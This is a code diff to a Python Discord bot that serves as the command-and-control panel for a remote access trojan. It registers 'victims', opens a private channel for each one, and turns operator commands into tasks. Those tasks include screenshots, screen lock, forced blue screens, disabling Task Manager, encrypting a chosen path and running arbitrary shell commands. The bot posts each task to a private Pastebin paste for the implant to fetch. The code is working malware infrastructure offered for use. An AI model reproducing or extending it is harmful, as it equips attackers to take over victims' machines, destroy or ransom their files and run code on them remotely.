@@ -180,10 +180,13 @@ print(f"EXE ready: dist\\{output_name}")
 
 import discord
 import re
+import requests
+import json
 
 TOKEN = "YOUR_BOT_TOKEN_HERE"
 GUILD_ID = 123456789012345678  # Server ID
 LOG_CHANNEL_ID = 987654321098765432  # Webhook channel ID
+PASTEBIN_DEV_KEY = "YOUR_PASTEBIN_DEV_KEY_HERE"  # From pastebin.com/api
 
 intents = discord.Intents.default()
 intents.message_content = True
@@ -194,64 +197,103 @@ bot = discord.Client(intents=intents)
 
 known_victims = set()
 
+def queue_to_pastebin(victim_id, command):
+    payload = {victim_id: command}
+    data = {
+        "api_dev_key": PASTEBIN_DEV_KEY,
+        "api_option": "paste",
+        "api_paste_code": json.dumps(payload),
+        "api_paste_private": "1",
+        "api_paste_name": f"cmd_{victim_id}",
+        "api_paste_expire_date": "N"
+    }
+    r = requests.post("https://pastebin.com/api/api_post.php", data=data)
+    if "pastebin.com" in r.text:
+        new_url = r.text.strip()
+        raw_url = new_url.replace("pastebin.com/", "pastebin.com/raw/")
+        print(f"[+] Queued {command} for {victim_id} - New raw URL: {raw_url}")
+        return raw_url
+    else:
+        print("[-] Pastebin failed:", r.text)
+        return None
+
 async def create_victim_section(victim_id):
     guild = bot.get_guild(GUILD_ID)
-    if not guild:
-        print("[FATAL] Wrong GUILD_ID - bot can't find server")
-        return None
+    if not guild: return None
     
-    category_name = f"Victim-{victim_id}"
-    category = discord.utils.get(guild.categories, name=category_name)
+    category = discord.utils.get(guild.categories, name=f"Victim-{victim_id}")
     if not category:
-        category = await guild.create_category(category_name)
-        print(f"[+] Created category: {category_name}")
+        category = await guild.create_category(f"Victim-{victim_id}")
     
-    channel_name = f"logs-{victim_id}"
-    channel = discord.utils.get(category.text_channels, name=channel_name)
+    channel = discord.utils.get(category.text_channels, name=f"logs-{victim_id}")
     if not channel:
         overwrites = {
             guild.default_role: discord.PermissionOverwrite(read_messages=False),
             guild.me: discord.PermissionOverwrite(read_messages=True, send_messages=True)
         }
-        channel = await category.create_text_channel(channel_name, overwrites=overwrites)
-        print(f"[+] Created private channel: {channel_name}")
+        channel = await category.create_text_channel(f"logs-{victim_id}", overwrites=overwrites)
     
     return channel
 
 @bot.event
 async def on_ready():
-    print(f"[+] {bot.user} locked in - watching channel {LOG_CHANNEL_ID} for bites")
+    print(f"[+] Bot online - commands ready (-ss, -lock, -bsod, -encrypt [path], -shell cmd)")
 
 @bot.event
 async def on_message(message):
-    print(f"[DEBUG] Message in {message.channel.name} ({message.channel.id}) | Webhook: {message.webhook_id is not None} | Bot author: {message.author.bot} | Content: {message.content[:100]}")
+    if message.author.bot: return
+    
+    print(f"[DEBUG] {message.author} in {message.channel.name}: {message.content}")
 
-    # Bite detection ONLY in log channel - include webhooks
+    # Bite detection
     if message.channel.id == LOG_CHANNEL_ID:
         full_text = message.content
         for embed in message.embeds:
-            if embed.title:
-                full_text += " " + embed.title
-            if embed.description:
-                full_text += " " + embed.description
+            full_text += " " + (embed.title or "") + " " + (embed.description or "")
         full_text = full_text.lower()
         
-        print(f"[DEBUG] Full parsed text: {full_text[:500]}...")
-        
         if "we got a bite captain" in full_text:
-            # Ironclad regex - catches [abc12345] prefix or any "Victim ID" format
-            match = re.search(r"\[([a-f0-9]{8})\]|victim.*?([a-f0-9]{8})", full_text)
+            match = re.search(r"\[([a-f0-9]{8})\]", full_text) or re.search(r"victim.*?([a-f0-9]{8})", full_text)
             if match:
-                victim_id = match.group(1) or match.group(2)
-                if victim_id in known_victims:
-                    print(f"[INFO] Already have victim {victim_id}")
-                    return
-                known_victims.add(victim_id)
-                print(f"[!!!] BITE DETECTED - Victim ID: {victim_id}")
-                
-                channel = await create_victim_section(victim_id)
-                if channel:
-                    await message.reply(f"**WE GOT A LIVE ONE** - Victim **{victim_id}** hooked\nControl room spawned: {channel.mention}")
+                victim_id = match.group(1)
+                if victim_id not in known_victims:
+                    known_victims.add(victim_id)
+                    channel = await create_victim_section(victim_id)
+                    if channel:
+                        await message.reply(f"**BITE** - Victim **{victim_id}** live\nRoom: {channel.mention}")
+
+    # Commands in victim channels
+    if message.channel.name.startswith("logs-"):
+        if message.content.startswith("-"):
+            content = message.content[1:].strip()
+            parts = content.split(" ", 1)
+            cmd = parts[0].lower()
+            arg = parts[1] if len(parts) > 1 else ""
+            
+            victim_match = re.search(r"logs-([a-f0-9]{8})", message.channel.name)
+            if not victim_match: return
+            victim_id = victim_match.group(1)
+            
+            if cmd in ["ss", "screenshot"]:
+                command = "ss"
+            elif cmd == "lock":
+                command = "lock"
+            elif cmd == "bsod":
+                command = "bsod"
+            elif cmd == "disabletm":
+                command = "disabletm"
+            elif cmd.startswith("encrypt"):
+                command = "encrypt " + arg
+            elif cmd.startswith("shell"):
+                command = "shell " + arg
+            else:
+                await message.reply("Valid: -ss, -lock, -bsod, -disabletm, -encrypt [path], -shell [cmd]")
                 return
+            
+            raw_url = queue_to_pastebin(victim_id, command)
+            if raw_url:
+                await message.reply(f"**{command}** queued for **{victim_id}**\nRebuild RAT with this raw URL:\n```{raw_url}```")
+            else:
+                await message.reply("Pastebin fucked up - check console")
 
 bot.run(TOKEN)
